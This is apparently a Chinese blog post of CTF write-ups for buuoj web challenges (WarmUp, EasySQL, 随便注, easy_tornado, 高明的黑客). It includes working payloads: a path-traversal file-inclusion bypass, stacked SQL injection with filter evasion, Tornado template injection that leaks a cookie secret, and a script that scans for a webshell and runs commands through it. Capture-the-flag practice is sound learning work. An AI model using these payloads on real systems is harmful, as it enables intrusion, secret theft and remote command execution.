---
layout: post
title:  "buuoj-从Web到去世"
date:   2019-9-3
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,buuoj,Web]
icon: icon-html
---

# buuoj-从Web到去世

## [HCTF 2018]WarmUp

开局一滑稽，看源码找到source.php，进去拿到源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

发现有个hint.php，进去看看

```
flag not here, and flag in ffffllllaaaagggg
```

文件包含，根据白名单，可以包含

```
http://cd9db9a0-af20-4d93-a66b-4ad9ddd2e0c4.node3.buuoj.cn/index.php?file=hint.php
http://cd9db9a0-af20-4d93-a66b-4ad9ddd2e0c4.node3.buuoj.cn/index.php?file=source.php
```

成功包含需要满足三个条件

1. `$_REQUEST['file']`不为空
2. `$_REQUEST['file']`是字符串
3. `$_REQUEST['file']`满足check

```php
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

用问号分割，取出字符串开头到第一个问号直接的字符串与白名单比较

payload

```
?file=source.php?/../../../../../ffffllllaaaagggg
```

./ 当前目录 ../ 上一级目录



## [SUCTF 2019]EasySQL

* ### 非预期解

  ```
  *,1
  ```



## 随便注

堆叠注入

输入select，被过滤

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

查表

```sql
1';show tables;
```

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}


```

flag在1919810931114514

用concat拼接绕过过滤，查flag，set保存flag，然后execute

```sql
1';
SET @a=concat("sel","ect flag from `1919810931114514`");
PREPARE fuck from @a;
execute fuck;
```



## easy_tornado

```
/flag.txt
flag in /fllllllllllllag
/welcome.txt
render
/hints.txt
md5(cookie_secret+md5(filename))
```

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/file?filename=/hints.txt&filehash=1153333b8be335fadb7d29f4ca1d96bc
```

找cookie_secret算filehash

渲染函数render()，文件全部在网页上

用错误的filehash试一下

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/file?filename=/fllllllllllllag
```

报error

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/error?msg=Error
```

尝试

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/error?msg={{1}}
```

出一个1

SSTI，服务器模板注入，查tornado，发现有个handler.settings

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/error?msg={{handler.settings}}
```

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'b47f8947-9982-44df-8db8-8c85856ab61f'}
```

拿到cookie_secret

```
<?php
$cookie_secret = 'b47f8947-9982-44df-8db8-8c85856ab61f';
$filename = '/fllllllllllllag';
echo '?filename=/fllllllllllllag&filehash='.md5($cookie_secret.md5($filename));
?>
```

```
http://47cb66a8-02e8-4e15-ae66-2d14c45521f8.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=08042157060a8acab29dde01ff6ddde8
```



## [强网杯 2019]高明的黑客

```
雁过留声，人过留名，此网站已被黑
我也是很佩服你们公司的开发，特地备份了网站源码到www.tar.gz以供大家观赏
```

下载源码，3002个文件，看不懂

站被日了，文件里必有马

本地跑，找到一个能用的然后cat flag

```python
import os
import requests

path = "/var/www/html/src/"
url = "http://127.0.0.1/src/"
files = os.listdir(path)

def search_get(f):
    gets = []
    with open(path+f, 'r') as f:
        for line in f.readlines():
            if "$_GET['" in line:
                start = line.find("$_GET['") + len("$_GET['")
                end = line.find("'", start)
                gets.append('?'+line[start:end]+'=')
    return gets

for i in range(0,len(files)):
    filename = 'xk0SzyKwfzw.php'
    #filename = files[i]
    gets = search_get(filename)
    for get in gets:
        fuck = url+filename+get+'echo wdnmd'
        r = requests.get(fuck)
        if 'wdnmd' in r.content:
            print(fuck)

```



```
http://ab3232d1-e24e-495a-a1fb-81b3632d4638.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
```



## [RoarCTF 2019]Easy Calc

略